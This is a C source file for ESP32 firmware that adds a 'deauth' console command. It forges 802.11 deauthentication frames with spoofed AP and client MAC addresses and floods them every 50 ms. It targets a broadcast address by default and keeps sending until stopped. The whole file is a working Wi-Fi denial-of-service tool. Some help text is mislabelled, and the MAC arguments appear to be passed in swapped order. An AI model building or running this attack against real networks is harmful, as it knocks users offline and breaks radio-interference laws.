#include "cmd_deauth.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"
#include <regex.h>
#include <stdbool.h>
#include <string.h>
#include "../system/baatsh/signal_ctrl.h"
#include "../modules/system/baatsh/fg_wrap.h"

#include "../../utils/wifi.h"

bool is_valid_mac(const char *mac_str) {
    regex_t regex;
    const char *pattern = "^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$";

    if (regcomp(&regex, pattern, REG_EXTENDED | REG_NOSUB) != 0)
        return false;

    bool result = regexec(&regex, mac_str, 0, NULL, 0) == 0;
    regfree(&regex);
    return result;
}

bool parse_mac(const char *mac_str, uint8_t mac[6]) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2],
                  &mac[3], &mac[4], &mac[5]) == 6;
}

void send_deauth(const uint8_t *source_mac, const uint8_t *ap_addr, const uint8_t *client_addr) {
    static uint8_t deauth_frame[sizeof(deauth_frame_default)];

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    memcpy(&deauth_frame[4], source_mac, 6);
    memcpy(&deauth_frame[10], ap_addr, 6);
    memcpy(&deauth_frame[16], client_addr, 6);

    printf ("[DEAUTH] Sending frame\n\tsource: %02X:%02X:%02X:%02X:%02X:%02X\n\tap; %02X:%02X:%02X:%02X:%02X:%02X\n\tclient: %02X:%02X:%02X:%02X:%02X:%02X\n",
        source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5],
        ap_addr[0], ap_addr[1], ap_addr[2], ap_addr[3], ap_addr[4], ap_addr[5],
        client_addr[0], client_addr[1], client_addr[2], client_addr[3], client_addr[4], client_addr[5]
    );

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

int trollDeauth(const char *source_str, const char *ap_str, const char *client_str) {
    uint8_t ap_mac[6];
    uint8_t source_mac[6];
    uint8_t client_macs[10][6];
    int client_count = 0;

    if (!ap_str || !is_valid_mac(ap_str) || !parse_mac(ap_str, ap_mac)) {
        printf("Invalid or missing AP MAC\n");
        return 1;
    }

    if (!source_str || strlen(source_str) == 0) {
        memcpy(source_mac, ap_mac, 6);
    } else {
        if (!is_valid_mac(source_str) || !parse_mac(source_str, source_mac)) {
            printf("Invalid source MAC\n");
            return 1;
        }
    }

    if (!client_str || strlen(client_str) == 0) {
        // Broadcast MAC
        memset(client_macs[0], 0xFF, 6);
        client_count = 1;
    } else {
        char *token;
        char *clients_copy = strdup(client_str);
        token = strtok(clients_copy, ",");
        while (token && client_count < 10) {
            if (is_valid_mac(token) && parse_mac(token, client_macs[client_count])) {
                client_count++;
            } else {
                printf("Invalid client MAC: %s\n", token);
                free(clients_copy);
                return 1;
            }
            token = strtok(NULL, ",");
        }
        free(clients_copy);
    }

    for (int i = 0; i < client_count; i++) {
        send_deauth(client_macs[i], ap_mac, source_mac);
    }

    return 0;
}

static struct {
    struct arg_str *source;
    struct arg_str *ap;
    struct arg_str *clients;
    struct arg_end *end;
} deauth_args;

static int do_deauth_cmd(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **)&deauth_args);
    if (nerrors != 0) {
        arg_print_errors(stderr, deauth_args.end, argv[0]);
        return 1;
    }

    const char *source = NULL;
    const char *ap = NULL;
    const char *clients = NULL;
    
    if (deauth_args.source->count > 0) {
        source = deauth_args.source->sval[0];
    }
    if (deauth_args.ap->count > 0) {
        ap = deauth_args.ap->sval[0];
    }
    if (deauth_args.clients->count > 0) {
        clients = deauth_args.clients->sval[0];
    }
    
    start_wifi(WIFI_MODE_STA, true);
    init_pps_timer();
    vTaskDelay(pdMS_TO_TICKS(100));

    while (1) {
        if (app_sig_abort()) {
            printf("\nQuiting...\n");
            break;
        }

        packet_count++;
        if(trollDeauth(source, ap, clients)) {
            return 1;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    stop_pps_timer();
    stop_wifi();
    vTaskDelay(pdMS_TO_TICKS(100));

    return 0;
}

void module_deauth(void)
{
    deauth_args.source = arg_str0("s", "source", "<mac>", "Custom SSID to use");
    deauth_args.ap = arg_str1("a", "ap", "<mac>", "Custom SSID to use");
    deauth_args.clients = arg_str0("c", "clients", "<mac,...>", "Clients to deauth");
    deauth_args.end = arg_end(3);
    const esp_console_cmd_t deauth_cmd = {
        .command = "deauth",
        .help = "Deauth a client list from a wifi network",
        .hint = NULL,
        .func = &do_deauth_cmd,
        .argtable = &deauth_args
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));
}